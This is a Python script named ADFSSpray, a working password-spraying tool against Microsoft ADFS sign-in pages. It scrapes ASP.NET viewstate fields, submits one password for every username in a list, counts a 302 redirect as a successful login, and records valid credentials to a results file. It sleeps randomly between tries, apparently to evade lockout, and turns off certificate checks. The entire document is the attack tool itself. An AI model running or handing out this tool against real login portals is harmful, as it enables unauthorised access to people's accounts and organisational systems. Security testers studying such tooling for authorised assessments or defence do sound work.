#!/usr/bin/python3
import sys, requests, random, time, logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib import quote, unquote
from bs4 import BeautifulSoup


MIN = 5     # 0.5
MAX = 15    # 1.5
DEBUG = False


class ADFSSpray:
    def __init__(self, base_url='https://website.com/adfs'):
        self.url = ''.join([
            base_url, '/ls/?wa=wsignin1.0&wtrealm=',
            quote(base_url, safe=''), quote('/services/trust', safe='')
        ])
        self.session = requests.session()
        self.viewstate = {
            "__db": "",
            "__EVENTTARGET": "",
            "__EVENTARGUMENT": "",
            "__VIEWSTATE": "",
            "__VIEWSTATEGENERATOR": "",
            "__EVENTVALIDATION": ""
        }
        self.check_debug()

    def do_get(self):
        return self.session.get(url=self.url, verify=False)

    def do_post(self, data):
        return self.session.post(url=self.url, data=data, verify=False, allow_redirects=False)

    def parse_page(self, content):
        soup = BeautifulSoup(content, 'lxml')
        for key,val in self.viewstate.iteritems():
            for tag in soup.select('input[name=%s]' % key):
                self.viewstate[key] = tag['value']
        return self

    def check_creds(self, username, password, domain=''):
        has_access = False
        try:
            if domain != '' and '@' not in username:
                username = '%s\\%s' % (domain, username)
            data = {
                "__db":"15",
                "ctl00$ddlLanguageMobile":"en-US",
                "ctl00$ddlLanguage":"en-US",
                "ctl00$ContentPlaceHolder1$txtUsername":username,
                "ctl00$ContentPlaceHolder1$txtPassword":password,
                "ctl00$ContentPlaceHolder1$SubmitButton":"SIGN IN",
            }
            data.update(self.viewstate)
            req = self.do_post(data=data)
            if req.status_code == 302:
                has_access = True
        except:
            has_access = False
        return has_access

    def get_viewstate(self):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        try:
            resp = self.do_get()
            self.parse_page(resp.content)
            data = {
                "ctl00$ddlLanguageMobile":"en-US",
                "ctl00$ddlLanguage":"en-US",
                "ctl00$ContentPlaceHolder1$ctl00":"EMAIL ADDRESS"
            }
            data.update(self.viewstate)
            resp = self.do_post(data=data)
            self.parse_page(resp.content)
        except:
            pass
        return self

    def check_debug(self):
        if DEBUG == False:
            return self
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

if __name__ == '__main__':
    try:
        target_server = sys.argv[1]
        domain_name = sys.argv[2]
        username_list = sys.argv[3]
        password = sys.argv[4]

        with open("spray_results.txt", "w") as log_file:
            starting = "[+] spraying server: %s domain: %s\n" % (target_server, domain_name)
            log_file.write(starting)
            print(starting)
            spray = ADFSSpray(target_server).get_viewstate()
            for username in open(username_list, "rb").readlines():
                print("[*] trying %s\\%s:%s\n" % (domain_name, username.strip(), password))
                if spray.check_creds(username.strip(), password, domain_name):
                    success = "[+][+][+] success %s\\%s:%s\n" % (domain_name, username.strip(), password)
                    log_file.write(success)
                    print(success)
                else:
                    failure = "[-] failed %s\\%s:%s\n" % (domain_name, username.strip(), password)
                    log_file.write(failure)
                    print(failure)
                print("[.] sleeping")
                time.sleep(random.randrange(MIN, MAX) * 0.1)

    except Exception as error:
        print(error)
        print("[+] usage: %s <target server> <domain> <username list> <password>" % sys.argv[0])
